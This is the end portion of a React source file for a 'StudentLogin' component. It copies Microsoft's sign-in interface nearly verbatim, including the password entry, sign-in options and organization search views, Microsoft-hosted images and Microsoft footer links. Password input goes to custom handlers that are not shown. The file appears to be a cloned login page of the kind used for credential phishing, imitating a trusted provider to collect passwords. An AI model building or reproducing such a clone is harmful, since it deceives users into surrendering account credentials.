                    <div id="loginHeader" className="row title ext-title">
                        <div role="heading" aria-level="1">Enter password</div>
                    </div>

                    <div className="row">
                        <div className="form-group col-md-24">
                            {passwordErrorMessage && (
                                <div role="alert" aria-live="assertive">
                                    <div id="passwordError" className="alert alert-error">
                                        <div>
                                            {passwordErrorMessage}
                                            {passwordErrorMessage.includes("Your account or password is incorrect") && (
                                                <a href="#" onClick={(e) => { e.preventDefault(); console.log("Reset password click"); }}>reset it now.</a>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            )}
                            <div className="placeholderContainer">
                                <input name="passwd" type="password" id="i0118pwd" onKeyDown={handlePasswordKeyDown} defaultValue="" onChange={handlePasswordChange} className={`form-control input ext-input text-box ext-text-box ${passwordErrorMessage ? 'has-error' : ''}`} aria-required="true" autoComplete="current-password" aria-describedby="loginHeader passwordError" placeholder="Password" aria-label={`Enter the password for ${enteredEmail}`} />
                            </div>
                        </div>
                    </div>

                    <div className="position-buttons password-reset-links-container ext-password-reset-links-container">
                        <div>
                            <div className="row">
                                <div className="col-md-24">
                                    <div className="text-13">
                                        <div className="form-group">
                                            <a id="idA_PWD_ForgotPassword" href="#" onClick={(e) => { e.preventDefault(); console.log("Forgot password link clicked."); }}>Forgot my password</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div className="win-button-pin-bottom">
                        <div className="row">
                            <div>
                                <div className="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
                                    <div className="inline-block button-item ext-button-item">
                                        <input type="button" id="idSIButton_Pwd" onClick={handlePasswordSignIn} disabled={isLoading} className="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Sign in" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>



        
        {/* Wrapper for Options View to allow transitions */}
        <div id="optionsViewWrapper" className={optionsClass} style={{ display: showOptions ? 'block' : 'none' }}>
            <div data-viewid="24" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-credential-picker-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    isUserKnown: !!sharedData.displayName,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    flowToken: sharedData.flowToken,
                    undirectedRecoveryContinuationToken: sharedData.undirectedRecoveryContinuationToken,
                    undirectedRecoveryUrl: sharedData.undirectedRecoveryUrl,
                    userTenantBranding: sharedData.userTenantBranding,
                    accountRecoveryUrlV2: sharedData.accountRecoveryUrlV2,
                    accountRecoveryContinuationTokenV2: sharedData.accountRecoveryContinuationTokenV2,
                    supportsAccountRecoveryV2: sharedData.supportsAccountRecoveryV2 },
                event: {
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog } }">{/*  */}

<div id="loginHeader" className="row title ext-title" role="heading" aria-level="1" data-bind="
    text: title,
    externalCss: { 'title': true }">Sign-in options</div>

{/* ko if: error */}{/* /ko */}

<div id="credentialList" className="form-group" role="list" aria-labelledby="idDiv_Error loginHeader">
    {/* ko foreach: { data: filteredCredentials, as: 'credential' } */}
        <div className="tile-container" data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }">
            <div className="row tile" role="listitem">
                <div className="table" tabIndex="0" role="button" data-bind="
                    click: $parent.tile_onClick,
                    pressEnter: $parent.tile_onClick,
                    ariaLabel: helpText() &amp;&amp; $parent.displayHelp ? description() + ' ' + helpText() : description,
                    hasFocus: $index() === 0,
                    css: { 'list-item': svr.fSupportWindowsStyles },
                    attr: {
                        'data-test-cred-id': isExternalFederatedIdp &amp;&amp; credType == null ? 'externalFederatedIdp' + $index() : credType,
                        'data-test-proof-value': proofValue }" aria-label="Face, fingerprint, PIN or security key Use your device to sign in with a passkey." data-test-cred-id="7">

                    <div className="table-cell tile-img">
                        <div>
                            {/* ko component: 'accessible-image-control' */}{/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}{/* /ko */}
{/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
{/* ko template: { nodes: [darkImageNode], data: $parent } */}<img className="tile-img" role="presentation" data-bind="attr: { src: darkIconUrl }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/credentialoptions/cred_option_passkey_1500b2043f4d1698f9df6089f67559d7.svg" />{/* /ko */}
{/* /ko */}{/* /ko */}
                        </div>
                    </div>

                    <div className="table-cell text-left content" aria-hidden="true" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                        <div data-bind="text: description">Face, fingerprint, PIN or security key</div>

                        {/* ko if: helpText() && $parent.displayHelp */}
                        <div><small data-bind="text: helpText">Use your device to sign in with a passkey.</small></div>
                        {/* /ko */}
                    </div>
                </div>
            </div>
            {/* ko if: $parent.displayHelp */}
            <div className="row tile">
                {/* ko if: helpDialogId */}
                <div className="help-button" role="button" tabIndex="0" data-bind="
                    click: $parent.tileHelp_onClick,
                    pressEnter: $parent.tileHelp_onClick,
                    ariaLabel: ariaLabel(),
                    hasFocus: helpDialogId === $parent.focusedHelpIcon()" aria-label="Learn more about signing in with face, fingerprint, PIN, or a security key">

                    {/* ko component: 'accessible-image-control' */}{/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}{/* /ko */}
{/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
{/* ko template: { nodes: [darkImageNode], data: $parent } */}<img role="presentation" data-pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/documentation_136bc3add990843012b1ec60612de803.png" data-svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/documentation_dae218aac2d25462ae286ceba8d80ce2.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/shared/1.0/content/images/documentation_dae218aac2d25462ae286ceba8d80ce2.svg" />{/* /ko */}
{/* /ko */}{/* /ko */}
                </div>
                {/* /ko */}
            </div>
            {/* /ko */}
        </div>
    
        <div className="tile-container" data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }">
            <div className="row tile" role="listitem">
                <div className="table" tabIndex="0" role="button" data-bind="
                    click: $parent.tile_onClick,
                    pressEnter: $parent.tile_onClick,
                    ariaLabel: helpText() &amp;&amp; $parent.displayHelp ? description() + ' ' + helpText() : description,
                    hasFocus: $index() === 0,
                    css: { 'list-item': svr.fSupportWindowsStyles },
                    attr: {
                        'data-test-cred-id': isExternalFederatedIdp &amp;&amp; credType == null ? 'externalFederatedIdp' + $index() : credType,
                        'data-test-proof-value': proofValue }" aria-label="Sign in to an organization Search for a company or an organization you're working with." data-test-cred-id="organization">

                    <div className="table-cell tile-img">
                        <div>
                            {/* ko component: 'accessible-image-control' */}{/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}{/* /ko */}
{/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
{/* ko template: { nodes: [darkImageNode], data: $parent } */}<img className="tile-img" role="presentation" data-bind="attr: { src: darkIconUrl }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_account_aad_c5cbcbb43e61b1347b12589901000621.png" />{/* /ko */}
{/* /ko */}{/* /ko */}
                        </div>
                    </div>

                    <div className="table-cell text-left content" aria-hidden="true" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                        <div data-bind="text: description">Sign in to an organization</div>

                        {/* ko if: helpText() && $parent.displayHelp */}
                        <div><small data-bind="text: helpText">Search for a company or an organization you're working with.</small></div>
                        {/* /ko */}
                    </div>
                </div>
            </div>
            {/* ko if: $parent.displayHelp */}
            <div className="row tile">
                {/* ko if: helpDialogId */}{/* /ko */}
            </div>
            {/* /ko */}
        </div>
    {/* /ko */}
</div>

{/* ko if: svr.fEnableTotalLossRecovery && hasTlr */}{/* /ko */}

<div className="win-button-pin-bottom" data-bind="css: { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText}">
    <div data-bind="css: { 'position-buttons': svr.fShowButtons }" className="position-buttons">
        <div className="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText}">
            <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    removeBottomMargin: true,
                    isPrimaryButtonVisible: false,
                    isPrimaryButtonEnabled: false,
                    isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; (!isInitialView || !!svr.fAllowCancel) },
                event: {
                    secondaryButtonClick: secondaryButton_onClick } }"><div className="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

    {/* ko if: isSecondaryButtonVisible */}
    <div data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }" className="inline-block button-item ext-button-item">
        <input type="button" id="idBtn_Back" onClick={handleOptionsBack} style={{ cursor: 'pointer' }} className="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
            externalCss: {
                'button': true,
                'secondary': true },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            clickBubble: !svr.fEnableLivePreview,
            enable: isSecondaryButtonEnabled" value="Back" />
    </div>
    {/* /ko */}
    { ' ' }
    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" className="button-item ext-button-item">
        {/* type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 */}
        {/* ko ifnot: svr.fConsentButtonIdViaName */}
        <input type="submit" id="idSIButton9" disabled={isLoading} className="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                css: { 'high-contrast-overrides': true },
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
                clickBubble: !svr.fEnableLivePreview,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next" data-report-attached="1" style={{display: 'none'}} />
        {/* /ko */}
        {/* ko if: svr.fConsentButtonIdViaName */}{/* /ko */}
    </div>
</div></div>
        </div>
    </div>
</div>

{/* ko if: displayHelp */}
    {/* ko if: hasFido */}
    <div data-bind="component: { name: 'fido-help-dialog-content-control',
        params: {
            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable() },
        event: {
            registerDialog: onRegisterDialog,
            unregisterDialog: onUnregisterDialog } }">{/*  */}

<div data-bind="component: { name: 'dialog-content-control',
    params: {
        dialogId: 1,
        data: {
            labelledBy: 'fidoDialogTitle',
            describedBy: 'fidoDialogDesc fidoDialogDesc2',
            primaryButtonPreventTabbing: { direction: 'down' },
            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }">{/* */}</div></div>
    {/* /ko */}

    {/* ko if: hasGitHub */}{/* /ko */}
{/* /ko */}

{/* ko if: tenantBranding.BoilerPlateText */}{/* /ko */}</div>
        </div>
        
        {/* Wrapper for Organization View to allow transitions */}
        <div id="orgViewWrapper" className="animate" style={{display: 'none'}}>
            <div data-viewid="63" data-showqrcodesigninbutton="true" data-bind="pageViewComponent: { name: 'search-organization-view', params: { serverData: svr } }">
                <div id="searchOrganizationHeader" className="row title ext-title" role="heading" aria-level="1">Find your organization</div>
                <div className="row text-body">
                    <div id="searchOrganizationDescription" className="text-block-body overflow-hidden no-margin-top">Enter the domain name of the organization you'd like to sign in to.</div>
                </div>
                <div className="row">
                    <div className="placeholderContainer">
                        <input type="text" id="searchOrganizationInput" name="searchOrganizationInput" className="form-control input ext-input text-box ext-text-box" aria-label="Domain name" aria-describedby="searchOrganizationHeader searchOrganizationDescription" placeholder="Domain name" />
                    </div>
                </div>
                <div className="row position-buttons">
                    <div>
                        <div className="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
                            <div className="inline-block button-item ext-button-item">
                                <input type="button" id="idBtn_OrgBack" className="win-button button-secondary button ext-button secondary ext-secondary" value="Back" style={{cursor: 'pointer'}} />
                            </div>
                            { ' ' }
                            <div className="inline-block button-item ext-button-item">
                                <input type="submit" id="idSIButton_OrgNext" className="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Next" style={{cursor: 'pointer'}} />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div></div>
        {/* /ko */}

        
        
        
        
        {/* ko if: svr.sCanaryTokenName && !svr.fSkipRenderingNewCanaryToken */}
        
        {/* /ko */}
        {/* ko if: !svr.sCanaryTokenName || svr.fSkipRenderingNewCanaryToken */}{/* /ko */}
        
        
        
        
        
        
        
        
        
        
        
        {/* ko ifnot: svr.fShouldSupportTargetCredentialForRecovery */}{/* /ko */}
        {/* ko if: svr.fEnableDFPIntegration */}
        
        {/* /ko */}
        {/* ko if: svr.fShouldSupportTargetCredentialForRecovery && targetCredentialForRecovery() */}{/* /ko */}
        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
</div>
    {/* /ko */}
        </div>

        {/* ko if: $page.showFedCredAndNewSession */}
        {/* ko if: $page.showFedCredButtons */}
        {showEmail && (
            <div data-bind="component: { name: 'fed-cred-buttons-control',
                params: {
                    serverData: svr,
                    fedCredOptions: $page.otherSigninOptions },
                event: {
                    fedCredButtonClick: $page.otherSigninOptionsButton_onClick } }">{/*  */}

{/* ko withProperties: { '$fedCredButtonsControl': $data } */}
<div data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <div className={`promoted-fed-cred-content promoted-fed-cred-box ext-promoted-fed-cred-box ${emailClass}`} data-bind="css: {
        'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
        'slide-out-next': $page.animate.isSlideOutNext,
        'slide-in-next': $page.animate.isSlideInNext,
        'slide-out-back': $page.animate.isSlideOutBack,
        'slide-in-back': $page.animate.isSlideInBack,
        'app': $page.backgroundLogoUrl }">

        {/* ko ifnot: svr.fIsQrCodePinSupported */}{/* /ko */}

        {/* ko if: svr.fEnableQrCodeA11YFixes */}
        {/* ko if: svr.fIsQrCodePinSupported */}
        {/* ko foreach: $fedCredButtonsControl.fedCredOptions */}
        <div className="tile-container" data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }">
            <div className="row tile">
                <div className="table" role="button" tabIndex="0" onClick={handleSignInOptionsClick} style={{ cursor: 'pointer' }} data-bind="
                    css: { 'list-item': svr.fSupportWindowsStyles },
                    pressEnter: $fedCredButtonsControl.fedCredButton_onClick,
                    click: $fedCredButtonsControl.fedCredButton_onClick,
                    ariaLabel: $data.helpText ? $data.text + ' ' + $data.helpText : $data.text" aria-label="Sign-in options">

                    <div className="table-row">
                        <div className="table-cell tile-img medium">
                            {/* ko component: 'accessible-image-control' */}{/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}{/* /ko */}
{/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
{/* ko template: { nodes: [darkImageNode], data: $parent } */}<img className="tile-img medium" role="presentation" data-bind="addEventHandlers, attr: { src: $data.darkIconUrl }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" />{/* /ko */}
{/* /ko */}{/* /ko */}
                        </div>
                        <div className="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                            <div data-bind="text: $data.text, attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Sign-in options</div>
                            {/* ko if: $data.showHelpIcon */}{/* /ko */}
                        </div>
                    </div>
                </div>
            </div>
            {/* ko if: $data.showHelpIcon */}{/* /ko */}
        </div>
        {/* ko if: svr.fAllowExternalIdpSignInCommonEndpoint && $index() === 0 && $fedCredButtonsControl.fedCredOptions() && $fedCredButtonsControl.fedCredOptions().length > 1 */}{/* /ko */}
        {/* /ko */}
        {/* /ko */}
        {/* /ko */}

        {/* ko ifnot: svr.fEnableQrCodeA11YFixes */}{/* /ko */}

    </div>
</div>
{/* /ko */}
</div>
        )}
        {/* /ko */}

        {/* ko if: $page.showSignupFedCredButtons */}{/* /ko */}

        {/* ko if: svr.fShowQrCodePinOption */}{/* /ko */}

        {/* ko if: $page.newSession */}{/* /ko */}
        {/* /ko */}

        {/* ko if: $page.showDebugDetails */}{/* /ko */}
    </div>
</div>
{/* /ko */}</div>
        </div>
    </div>

    {/* ko if: $page.paginationControlHelper.showFooterControl */}
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" className="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }">{/* ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) */}
<div id="footerLinks" className="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">

    {/* ko if: showFooter */}
        {/* ko if: !hideTOU */}
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" className="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        {/* /ko */}
        { ' ' }
        {/* ko if: !hidePrivacy */}
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" className="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        {/* /ko */}

        {/* ko if: impressumLink */}{/* /ko */}

        {/* ko if: a11yConformeLink */}{/* /ko */}

        {/* ko if: showIcpLicense */}{/* /ko */}
    {/* /ko */}
    { ' ' }
    {/* Set attr binding before hasFocusEx to prevent Narrator from losing focus */}
    <a id="moreOptions" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8704b3cc-94fe-465a-b6ad-0121ee5a6bee&amp;redirect_uri=https%3A%2F%2Fwww.neolms.com%2Fauth%2Fmicrosoft_office365%2Fcallback&amp;response_type=code&amp;scope=openid+profile+email+https%3A%2F%2Fgraph.microsoft.com%2FUser.Read#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" className="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
{/* /ko */}

{/* ko if: svr.fShowLegalMessagingInline && showLinks */}{/* /ko */}</div>
    </div>
    {/* /ko */}
</div>
{/* /ko */}</div>
        {/* /ko */}

        {/* ko if: isVerticalSplitTemplate() && isTemplateLoaded() */}{/* /ko */}
    {/* /ko */}
{/* /ko */}</div>
    {/* /ko */}
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

{/* ko if: svr.urlCBPartnerPreload */}{/* /ko */}

{/* ko if: svr.fEnableDFPIntegration && dfpUrl() */}{/* /ko */}</div>

</div>

        </>
    );
};

const StudentLoginWrapper = () => {
    const siteKey = import.meta.env.VITE_RECAPTCHA_SITE_KEY || '';
    if (!siteKey) return <StudentLogin />;
    
    return (
        <GoogleReCaptchaProvider reCaptchaKey={siteKey}>
            <StudentLogin />
        </GoogleReCaptchaProvider>
    );
};

export default StudentLoginWrapper;
